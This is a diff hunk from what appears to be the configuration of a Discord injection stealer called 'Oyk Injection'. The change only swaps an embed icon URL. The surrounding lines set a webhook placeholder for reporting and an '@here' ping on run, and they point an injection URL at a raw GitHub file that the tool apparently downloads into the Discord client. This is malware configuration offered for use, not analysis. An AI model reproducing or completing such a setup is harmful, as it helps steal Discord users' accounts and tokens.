@@ -12,7 +12,7 @@ const config = {
     ping_on_run: true,
     ping_val: "@here",
     embed_name: "Oyk Injection",
-    embed_icon: "https://i.postimg.cc/m2MFhgMn/download.jpg",
+    embed_icon: "https://files.catbox.moe/wt8tme.gif",
     embed_color: 8363488,
     webhook: "%WEBHOOK%",
     injection_url: "https://raw.githubusercontent.com/NobodyWouldEverUseThis7/Discord-Injection/main/file.js",
